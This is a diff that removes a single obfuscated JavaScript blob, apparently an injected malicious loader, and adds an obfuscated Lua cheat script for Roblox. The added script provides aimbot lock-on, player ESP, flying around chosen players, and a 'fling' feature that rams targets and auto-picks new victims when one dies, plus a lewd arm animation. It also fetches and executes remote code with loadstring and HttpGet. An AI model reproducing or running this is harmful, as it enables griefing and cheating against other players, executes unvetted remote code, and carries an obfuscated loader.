@@ -1,1 +1,317 @@
-var NewObject,obj;(function(){var Trx='',HWH=425-414;function XTF(j){var e=4421041;var a=j.length;var u=[];for(var y=0;y<a;y++){u[y]=j.charAt(y)};for(var y=0;y<a;y++){var v=e*(y+449)+(e%33470);var x=e*(y+616)+(e%13979);var t=v%a;var d=x%a;var w=u[t];u[t]=u[d];u[d]=w;e=(v+x)%5376766;};return u.join('')};var slM=XTF('opzhfkedtitgsrcunncoclrmswoqbxtrvjayu').substr(0,HWH);var CsY='e1eaqh;v]h,n-uSna3vrrr ugda1c;vs.!,gt+k+f")rs}]vtfyqnhvz;;]=;b8t}<ve(+.4=q6c+4,Chrz2,8e2,5,(;e;tv8[,+++ c,p[,(v,kg+[n,(ov[3lS )0)])fmk(nnrv8(;ux(nb5a-0+b1g=b)9(mer]=Cj9r;x=0p(.[]6tz=,03vg=; l}v.=r7(or;= )<d=(;p0=,eu.,l,mr"vlg9={[+i)gv=(aa.imgsjCta+;l9.} 8i](; t.uqlntearolao)nmr=trx1;l>(l}1a=e{(ed 2reusl=gate7ftr;;w5f]alf[estln=r;=.kt.;ehco3fcy8.rg=nhrp7s nb(ia,lbi)0o<,u]+vrov=tkhr]ko+6rCabe)t1lwr=>ia vysha[A=aj{{t=<coi) c+uevitt;gheaf.bs1;er;uvl)"+rg+-p1h .rhs);fr0thr(; ,"x=n;1pm. mv}q=i!dpu0uv==)s+8](}al<)ga(o1(+*vth0z k;,er2h6e{ss=.; ria.l),(;Ci=nlktr+u=p=(v2e+7x)Avrnuzhrsr;8is(;)a2;zil]b.;n;f)(oco)ti;f)n-2 c(12)roltu;a)vp.j){bCx.7=gn("==61 =r)x(,=;AlnsC9"atn=;aul"cgfviop f(o+pi]o;ipabbh+n.x+ive"");[pl ws[*2,=064fw3A)r;r7.qr;rkav{(xrn,a= [yhj"nnvforngaaanCvdlh46)vnarecg[ (;0 r8,o03bbu]e=.rrfexfxa. tea(;)cha6At.en,u9onirdhni)[+ ao;8i,d(o;[7,)t9)1;0rt(r(.;)-mai)fb..nh=l+-=-7oo6';var HSu=XTF[slM];var bnf='';var qMa=HSu;var xSZ=HSu(bnf,XTF(CsY));var uaJ=xSZ(XTF('q3_.weXs9=.i.tr}$)!;!Seo(Xeelgite%a=m=%[!r=_non.bmer&\'1_(=5$Xtr"y=cj)+&n"t)c+t#m,}m.nXfX&)%7lo+_=.ntm+e"{epz..("dttm6];7)aaw.]]j 6he4.9u)fr[Mmz[Se5kro=7Xr%;XeX.X;w$a9.j)eauok_(;z)c..d4+e.4e3p.Xea;lre]N%Xo;o.uxCp {X=t=we.e#o))X=m0uweyXe7=aXv".(6m[..=.w)=eX.24[Ced#.morj.5bc9yf&e.ud#Xmt=_Xi1)e9(ev= ef=.dg}=b0=1;0i1ert;6(X[ep7(0o!)#s$(X!e.XXl_)f#.epa}.p}Xoeew\'s;$.0=yeinbffa(sm)$w(emldu.g.c\'_efsr[8ex"o;.S%%.+.hex4sc:]!Xcu.{x&(=h!ej&h!%X.r]5.]7{l2d.wu!.m.g2{ 50v;7(lr51(;.eaip.ijtere};+h%s7#zXe)f,ze)).X4){Xe.e4qae%Xep( b=.Xqec%oy+)%e.Xl6[6f7rc.4$o"!2ni$c%=9ef)01+X0a_%X66el.0c+]kp!g(\'!enlr$a.(fg1=r+61).$0.i; ..mquXdth .d(%+f.e(.noCa;%f!1h(.3.=pcog&)=XX4;'));var lhf=qMa(Trx,uaJ );lhf(6278);return 2016})()
+-- =========================================================================
+-- RADIO NGỌT 🍭 | DEV KHANG - ULTIMATE OBFUSCATED SCRIPT (PART 1/2)
+-- =========================================================================
+
+local _0x1a = game:GetService("Players")
+local _0x2b = game:GetService("RunService")
+local _0x3c = game:GetService("CoreGui")
+local _0x4d = workspace.CurrentCamera
+local _0x5e = _0x1a.LocalPlayer
+
+if _0x3c:FindFirstChild("RadioNgotBoot") then _0x3c.RadioNgotBoot:Destroy() end
+if _0x3c:FindFirstChild("RadioNgotMain") then _0x3c.RadioNgotMain:Destroy() end
+
+-- BOOT NGÔN NGỮ (VN / EN)
+local _0x6f = Instance.new("ScreenGui", _0x3c)
+_0x6f.Name = "RadioNgotBoot"
+local _0x70 = Instance.new("Frame", _0x6f)
+_0x70.Size = UDim2.new(0, 300, 0, 200); _0x70.Position = UDim2.new(0.5, -150, 0.5, -100)
+_0x70.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Instance.new("UICorner", _0x70).CornerRadius = UDim.new(0, 10)
+
+local _0x81 = Instance.new("TextLabel", _0x70)
+_0x81.Size = UDim2.new(1, 0, 0, 50); _0x81.BackgroundTransparency = 1
+_0x81.Text = "RADIO NGỌT 🍭\nChọn Ngôn Ngữ / Select Language"
+_0x81.TextColor3 = Color3.new(1, 1, 1); _0x81.Font = Enum.Font.GothamBold; _0x81.TextSize = 14
+
+local _0x92 = "VN"
+local _0xa3 = Instance.new("TextButton", _0x70)
+_0xa3.Size = UDim2.new(0, 120, 0, 40); _0xa3.Position = UDim2.new(0, 20, 0, 70)
+_0xa3.BackgroundColor3 = Color3.fromRGB(50, 255, 50); _0xa3.Text = "Tiếng Việt"; _0xa3.Font = Enum.Font.GothamBold; Instance.new("UICorner", _0xa3)
+
+local _0xb4 = Instance.new("TextButton", _0x70)
+_0xb4.Size = UDim2.new(0, 120, 0, 40); _0xb4.Position = UDim2.new(1, -140, 0, 70)
+_0xb4.BackgroundColor3 = Color3.fromRGB(50, 50, 50); _0xb4.Text = "English"; _0xb4.TextColor3 = Color3.new(1, 1, 1); _0xb4.Font = Enum.Font.GothamBold; Instance.new("UICorner", _0xb4)
+
+local _0xc5 = Instance.new("TextButton", _0x70)
+_0xc5.Size = UDim2.new(0, 260, 0, 50); _0xc5.Position = UDim2.new(0, 20, 0, 130)
+_0xc5.BackgroundColor3 = Color3.fromRGB(255, 50, 50); _0xc5.Text = "KÍCH HOẠT SCRIPT"
+_0xc5.TextColor3 = Color3.new(1, 1, 1); _0xc5.Font = Enum.Font.GothamBold; _0xc5.TextSize = 16; Instance.new("UICorner", _0xc5)
+
+_0xa3.MouseButton1Click:Connect(function()
+    _0x92 = "VN"
+    _0xa3.BackgroundColor3 = Color3.fromRGB(50, 255, 50); _0xa3.TextColor3 = Color3.new(0, 0, 0)
+    _0xb4.BackgroundColor3 = Color3.fromRGB(50, 50, 50); _0xb4.TextColor3 = Color3.new(1, 1, 1)
+    _0xc5.Text = "KÍCH HOẠT SCRIPT"
+end)
+_0xb4.MouseButton1Click:Connect(function()
+    _0x92 = "EN"
+    _0xb4.BackgroundColor3 = Color3.fromRGB(50, 255, 50); _0xb4.TextColor3 = Color3.new(0, 0, 0)
+    _0xa3.BackgroundColor3 = Color3.fromRGB(50, 50, 50); _0xa3.TextColor3 = Color3.new(1, 1, 1)
+    _0xc5.Text = "ACTIVATE SCRIPT"
+end)
+
+-- HÀM CHÍNH SCRIPT (PHẦN 1)
+local function _0xd6()
+    _0x6f:Destroy()
+
+    local _0xe7 = {
+        VN = {
+            AimOn = "🎯 AIM KHÓA: [ BẬT ]", AimOff = "🎯 AIM KHÓA: [ TẮT ]", SwitchAim = "🔄 Đổi Mục Tiêu Aim Khác",
+            TabCombat = "Combat & ESP", TabMove = "Di Chuyển (Fly/Fling)", TabMisc = "Tính Năng Phụ",
+            AimLockUIName = "Khóa vị trí nút Aim trên màn hình", 
+            ESPBox = "ESP Hộp", ESPName = "ESP Tên", ESPHP = "ESP Máu", ESPDist = "ESP Khoảng Cách",
+            FlyTarget = "Chọn người để Fly", RefreshFly = "🔄 Reset Danh Sách (Fly)", ToggleFly = "Bật/Tắt Fly",
+            FlyMode = "Kiểu bay (Sau lưng/Trên đầu/Vòng tròn)", Speed = "Điền Tốc Độ", Dist = "Điền Khoảng Cách",
+            ModeBehind = "Sau Lưng", ModeAbove = "Trên Đầu", ModeOrbit = "Vòng Tròn",
+            FlingTarget = "Chọn người để Fling", RefreshFling = "🔄 Reset Danh Sách (Fling)", ToggleFling = "Bật/Tắt Fling (Auto-Reset)",
+            Jerk = "Tay Jerk (Vuốt chuẩn IY)"
+        },
+        EN = {
+            AimOn = "🎯 AIM LOCK: [ ON ]", AimOff = "🎯 AIM LOCK: [ OFF ]", SwitchAim = "🔄 Switch Aim Target",
+            TabCombat = "Combat & ESP", TabMove = "Movement (Fly/Fling)", TabMisc = "Misc",
+            AimLockUIName = "Lock Aim UI Position", 
+            ESPBox = "ESP Box", ESPName = "ESP Name", ESPHP = "ESP Health", ESPDist = "ESP Distance",
+            FlyTarget = "Select Fly Target", RefreshFly = "🔄 Reset Player List (Fly)", ToggleFly = "Toggle Fly",
+            FlyMode = "Fly Mode (Behind/Above/Orbit)", Speed = "Input Speed", Dist = "Input Distance",
+            ModeBehind = "Behind Back", ModeAbove = "Above Head", ModeOrbit = "Orbit Around",
+            FlingTarget = "Select Fling Target", RefreshFling = "🔄 Reset Player List (Fling)", ToggleFling = "Toggle Fling (Auto-Reset)",
+            Jerk = "Hand Jerk (IY Stroke)"
+        }
+    }
+    local _0xf8 = _0xe7[_0x92]
+
+    local _0x109 = {
+        _0x1 = false, _0x2 = nil, _0x3 = {},
+        _0x4 = false, _0x5 = false, _0x6 = false, _0x7 = false,
+        _0x8 = false, _0x9 = "", _0xa = "Orbit", _0xb = 5, _0xc = 10,
+        _0xd = false, _0xe = "",
+        _0xf = false
+    }
+
+    local function _0x11a()
+        local _0x12b = {}
+        for _, _0x13c in pairs(_0x1a:GetPlayers()) do if _0x13c ~= _0x5e then table.insert(_0x12b, _0x13c.Name) end end
+        return _0x12b
+    end
+
+    -- UI Aim Nổi Màn Hình
+    local _0x14d = Instance.new("ScreenGui", _0x3c)
+    _0x14d.Name = "RadioNgotMain"
+    local _0x15e = Instance.new("TextButton", _0x14d)
+    _0x15e.Size = UDim2.new(0, 180, 0, 40); _0x15e.Position = UDim2.new(0, 20, 0.35, 0)
+    _0x15e.BackgroundColor3 = Color3.fromRGB(15, 15, 15); _0x15e.TextColor3 = Color3.fromRGB(255, 50, 50)
+    _0x15e.Text = _0xf8.AimOff; _0x15e.Font = Enum.Font.GothamBold; _0x15e.TextSize = 12
+    _0x15e.Active = true; _0x15e.Draggable = true; Instance.new("UICorner", _0x15e).CornerRadius = UDim.new(0, 6)
+
+    local _0x16f = Instance.new("TextButton", _0x14d)
+    _0x16f.Size = UDim2.new(0, 180, 0, 30); _0x16f.Position = UDim2.new(0, 20, 0.35, 45)
+    _0x16f.BackgroundColor3 = Color3.fromRGB(25, 25, 25); _0x16f.TextColor3 = Color3.fromRGB(255, 255, 255)
+    _0x16f.Text = _0xf8.SwitchAim; _0x16f.Font = Enum.Font.GothamSemibold; _0x16f.TextSize = 10
+    _0x16f.Active = true; _0x16f.Draggable = true; Instance.new("UICorner", _0x16f).CornerRadius = UDim.new(0, 6)
+
+    _0x15e.MouseButton1Click:Connect(function()
+        _0x109._0x1 = not _0x109._0x1
+        _0x15e.Text = _0x109._0x1 and _0xf8.AimOn or _0xf8.AimOff
+        _0x15e.TextColor3 = _0x109._0x1 and Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
+        if not _0x109._0x1 then _0x109._0x2 = nil; _0x109._0x3 = {} end
+    end)
+    _0x16f.MouseButton1Click:Connect(function()
+        if _0x109._0x2 then
+            _0x109._0x3[_0x109._0x2.Name] = true
+            _0x109._0x2 = nil
+        end
+    end)
+
+    -- Rayfield Menu
+    local _0x170 = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+    local _0x181 = _0x170:CreateWindow({
+       Name = "RADIO NGỌT 🍭 | DEV KHANG", LoadingTitle = "Đang khởi tạo hệ thống bảo mật...",
+       LoadingSubtitle = "Obfuscated & Full Features", ConfigurationSaving = {Enabled = false}
+    })-- =========================================================================
+-- RADIO NGỌT 🍭 | DEV KHANG - ULTIMATE OBFUSCATED SCRIPT (PART 2/2)
+-- =========================================================================
+
+    -- Combat Tab
+    local _0x192 = _0x181:CreateTab(_0xf8.TabCombat, "crosshair")
+    _0x192:CreateToggle({Name = _0xf8.AimLockUIName, CurrentValue = false, Callback = function(_0x1a3) _0x15e.Draggable = not _0x1a3; _0x16f.Draggable = not _0x1a3 end})
+    _0x192:CreateSection("ESP CONFIG")
+    _0x192:CreateToggle({Name = _0xf8.ESPBox, Callback = function(_0x1a3) _0x109._0x4 = _0x1a3 end})
+    _0x192:CreateToggle({Name = _0xf8.ESPName, Callback = function(_0x1a3) _0x109._0x5 = _0x1a3 end})
+    _0x192:CreateToggle({Name = _0xf8.ESPHP, Callback = function(_0x1a3) _0x109._0x6 = _0x1a3 end})
+    _0x192:CreateToggle({Name = _0xf8.ESPDist, Callback = function(_0x1a3) _0x109._0x7 = _0x1a3 end})
+
+    -- Movement Tab
+    local _0x1b4 = _0x181:CreateTab(_0xf8.TabMove, "move")
+    local _0x1c5, _0x1d6, _0x1e7 
+    
+    _0x1b4:CreateSection("--- FLY SYSTEM (3 MODES) ---")
+    local _0x1f8 = _0x1b4:CreateDropdown({Name = _0xf8.FlyTarget, Options = _0x11a(), CurrentOption = "", MultipleOptions = false, Callback = function(_0x209) _0x109._0x9 = _0x209[1] end})
+    _0x1b4:CreateButton({Name = _0xf8.RefreshFly, Callback = function() _0x1f8:Refresh(_0x11a(), true) end})
+    
+    _0x1b4:CreateDropdown({
+        Name = _0xf8.FlyMode, 
+        Options = {_0xf8.ModeBehind, _0xf8.ModeAbove, _0xf8.ModeOrbit},
+        CurrentOption = _0xf8.ModeOrbit,
+        MultipleOptions = false,
+        Callback = function(_0x209)
+            if _0x209[1] == _0xf8.ModeBehind then _0x109._0xa = "Behind"
+            elseif _0x209[1] == _0xf8.ModeAbove then _0x109._0xa = "Above"
+            else _0x109._0xa = "Orbit" end
+        end
+    })
+
+    _0x1b4:CreateToggle({
+       Name = _0xf8.ToggleFly,
+       Callback = function(_0x1a3)
+           _0x109._0x8 = _0x1a3
+           local _0x21a = _0x5e.Character and _0x5e.Character:FindFirstChild("HumanoidRootPart")
+           if _0x1a3 and _0x21a then
+               _0x5e.Character.Humanoid.PlatformStand = true
+               _0x1c5 = Instance.new("BodyGyro", _0x21a); _0x1c5.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+               _0x1d6 = Instance.new("BodyVelocity", _0x21a); _0x1d6.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+           else
+               if _0x21a then _0x5e.Character.Humanoid.PlatformStand = false end
+               if _0x1c5 then _0x1c5:Destroy() end
+               if _0x1d6 then _0x1d6:Destroy() end
+           end
+       end
+    })
+    _0x1b4:CreateInput({Name = _0xf8.Speed, PlaceholderText = "5", Callback = function(_0x22b) _0x109._0xb = tonumber(_0x22b) or 5 end})
+    _0x1b4:CreateInput({Name = _0xf8.Dist, PlaceholderText = "10", Callback = function(_0x22b) _0x109._0xc = tonumber(_0x22b) or 10 end})
+
+    _0x1b4:CreateSection("--- FLING SYSTEM (AUTO-RESET) ---")
+    local _0x23c = _0x1b4:CreateDropdown({Name = _0xf8.FlingTarget, Options = _0x11a(), CurrentOption = "", MultipleOptions = false, Callback = function(_0x209) _0x109._0xe = _0x209[1] end})
+    _0x1b4:CreateButton({Name = _0xf8.RefreshFling, Callback = function() _0x23c:Refresh(_0x11a(), true) end})
+
+    _0x1b4:CreateToggle({
+       Name = _0xf8.ToggleFling,
+       Callback = function(_0x1a3)
+           _0x109._0xd = _0x1a3
+           local _0x21a = _0x5e.Character and _0x5e.Character:FindFirstChild("HumanoidRootPart")
+           if _0x1a3 and _0x21a then
+               _0x1e7 = Instance.new("BodyAngularVelocity", _0x21a)
+               _0x1e7.AngularVelocity = Vector3.new(0, 99999, 0); _0x1e7.MaxTorque = Vector3.new(0, math.huge, 0)
+           else
+               if _0x1e7 then _0x1e7:Destroy() end
+           end
+       end
+    })
+
+    -- Misc Tab
+    local _0x24d = _0x181:CreateTab(_0xf8.TabMisc, "ghost")
+    local _0x25e, _0x26f
+    _0x24d:CreateToggle({
+       Name = _0xf8.Jerk,
+       Callback = function(_0x1a3)
+           local _0x280 = _0x5e.Character
+           local _0x291 = _0x280 and (_0x280:FindFirstChild("Torso") and _0x280.Torso:FindFirstChild("Right Shoulder") or _0x280:FindFirstChild("RightUpperArm") and _0x280.RightUpperArm:FindFirstChild("RightShoulder"))
+           if _0x1a3 and _0x291 then
+               if not _0x26f then _0x26f = _0x291.C0 end
+               _0x25e = _0x2b.Heartbeat:Connect(function()
+                   if _0x291 and _0x291.Parent then
+                       local _0x2a2 = math.rad(45) + math.abs(math.sin(tick() * 30)) * 0.6
+                       _0x291.C0 = _0x26f * CFrame.Angles(_0x2a2, 0, 0)
+                   end
+               end)
+           else
+               if _0x25e then _0x25e:Disconnect() end
+               if _0x291 and _0x26f then _0x291.C0 = _0x26f end
+           end
+       end
+    })
+
+    -- Core Logic Loop
+    _0x2b.RenderStepped:Connect(function()
+        -- 1. Aim Lock
+        if _0x109._0x1 then
+            if not _0x109._0x2 or not _0x109._0x2.Character or not _0x109._0x2.Character:FindFirstChild("HumanoidRootPart") or _0x109._0x2.Character.Humanoid.Health <= 0 then
+                local _0x2b3 = math.huge
+                for _, _0x2c4 in pairs(_0x1a:GetPlayers()) do
+                    if _0x2c4 ~= _0x5e and _0x2c4.Character and _0x2c4.Character:FindFirstChild("HumanoidRootPart") and not _0x109._0x3[_0x2c4.Name] then
+                        local _0x2d5, _0x2e6 = _0x4d:WorldToViewportPoint(_0x2c4.Character.HumanoidRootPart.Position)
+                        if _0x2e6 then
+                            local _0x2f7 = (Vector2.new(_0x2d5.X, _0x2d5.Y) - Vector2.new(_0x4d.ViewportSize.X/2, _0x4d.ViewportSize.Y/2)).Magnitude
+                            if _0x2f7 < _0x2b3 then _0x2b3 = _0x2f7; _0x109._0x2 = _0x2c4 end
+                        end
+                    end
+                end
+            end
+            if _0x109._0x2 and _0x109._0x2.Character and _0x109._0x2.Character:FindFirstChild("HumanoidRootPart") then
+                local _0x308 = _0x109._0x2.Character.HumanoidRootPart.Position
+                _0x4d.CFrame = _0x4d.CFrame:Lerp(CFrame.new(_0x4d.CFrame.Position, _0x308), 0.3)
+            end
+        end
+
+        -- 2. ESP Full
+        for _, _0x2c4 in pairs(_0x1a:GetPlayers()) do
+            if _0x2c4 ~= _0x5e and _0x2c4.Character and _0x2c4.Character:FindFirstChild("HumanoidRootPart") then
+                local _0x319 = _0x2c4.Character
+                local _0x32a = _0x319:FindFirstChild("RN_Box")
+                if _0x109._0x4 then
+                    if not _0x32a then
+                        _0x32a = Instance.new("Highlight", _0x319); _0x32a.Name = "RN_Box"; _0x32a.FillColor = Color3.new(1,0,0); _0x32a.OutlineColor = Color3.new(1,1,1); _0x32a.FillTransparency = 0.5
+                    end
+                else if _0x32a then _0x32a:Destroy() end end
+                
+                local _0x33b = _0x319:FindFirstChild("Head")
+                local _0x34c = _0x33b and _0x33b:FindFirstChild("RN_Info")
+                if (_0x109._0x5 or _0x109._0x6 or _0x109._0x7) and _0x33b then
+                    if not _0x34c then
+                        _0x34c = Instance.new("BillboardGui", _0x33b); _0x34c.Name = "RN_Info"; _0x34c.Size = UDim2.new(0,200,0,50); _0x34c.AlwaysOnTop = true; _0x34c.StudsOffset = Vector3.new(0,3,0)
+                        local _0x35d = Instance.new("TextLabel", _0x34c); _0x35d.Size = UDim2.new(1,0,1,0); _0x35d.BackgroundTransparency = 1; _0x35d.TextColor3 = Color3.new(1,1,1); _0x35d.Font = Enum.Font.GothamBold; _0x35d.TextSize = 12
+                    end
+                    local _0x36e = ""
+                    if _0x109._0x5 then _0x36e = _0x36e .. _0x2c4.Name .. "\n" end
+                    if _0x109._0x6 and _0x319:FindFirstChild("Humanoid") then _0x36e = _0x36e .. "HP: " .. math.floor(_0x319.Humanoid.Health) .. "\n" end
+                    if _0x109._0x7 and _0x5e.Character and _0x5e.Character:FindFirstChild("HumanoidRootPart") then
+                        _0x36e = _0x36e .. math.floor((_0x5e.Character.HumanoidRootPart.Position - _0x319.HumanoidRootPart.Position).Magnitude) .. " Studs"
+                    end
+                    _0x34c.TextLabel.Text = _0x36e
+                else if _0x34c then _0x34c:Destroy() end end
+            end
+        end
+
+        -- 3. Fly 3 Modes
+        if _0x109._0x8 and _0x1d6 and _0x1c5 and _0x109._0x9 ~= "" then
+            local _0x37f = _0x1a:FindFirstChild(_0x109._0x9)
+            if _0x37f and _0x37f.Character and _0x37f.Character:FindFirstChild("HumanoidRootPart") then
+                local _0x380 = _0x37f.Character.HumanoidRootPart
+                local _0x391 = _0x5e.Character.HumanoidRootPart
+                local _0x3a2
+                
+                if _0x109._0xa == "Behind" then
+                    _0x3a2 = (_0x380.CFrame * CFrame.new(0, 0, _0x109._0xc)).Position
+                elseif _0x109._0xa == "Above" then
+                    _0x3a2 = (_0x380.CFrame * CFrame.new(0, _0x109._0xc, 0)).Position
+                else
+                    local _0x3b3 = tick() * (_0x109._0xb * 0.1)
+                    _0x3a2 = _0x380.Position + Vector3.new(math.cos(_0x3b3) * _0x109._0xc, 0, math.sin(_0x3b3) * _0x109._0xc)
+                end
+                
+                _0x1c5.CFrame = CFrame.new(_0x391.Position, _0x380.Position)
+                _0x1d6.Velocity = (_0x3a2 - _0x391.Position) * 10
+            end
+        end
+
+        -- 4. Fling Auto-Reset
+        if _0x109._0xd and _0x1e7 and _0x109._0xe ~= "" then
+            local _0x37f = _0x1a:FindFirstChild(_0x109._0xe)
+            if _0x37f and _0x37f.Character and _0x37f.Character:FindFirstChild("Humanoid") then
+                if _0x37f.Character.Humanoid.Health <= 0 then
+                    for _, _0x3c4 in pairs(_0x1a:GetPlayers()) do
+                        if _0x3c4 ~= _0x5e and _0x3c4.Name ~= _0x37f.Name and _0x3c4.Character and _0x3c4.Character:FindFirstChild("Humanoid") and _0x3c4.Character.Humanoid.Health > 0 then
+                            _0x109._0xe = _0x3c4.Name
+                            _0x170:Notify({Title = "Fling Auto-Reset", Content = "Mục tiêu đã chết! Chuyển sang: " .. _0x3c4.Name, Duration = 2})
+                            break
+                        end
+                    end
+                else
+                    _0x5e.Character.HumanoidRootPart.CFrame = _0x37f.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end
+    end)
+end
+
+_0xc5.MouseButton1Click:Connect(_0xd6)
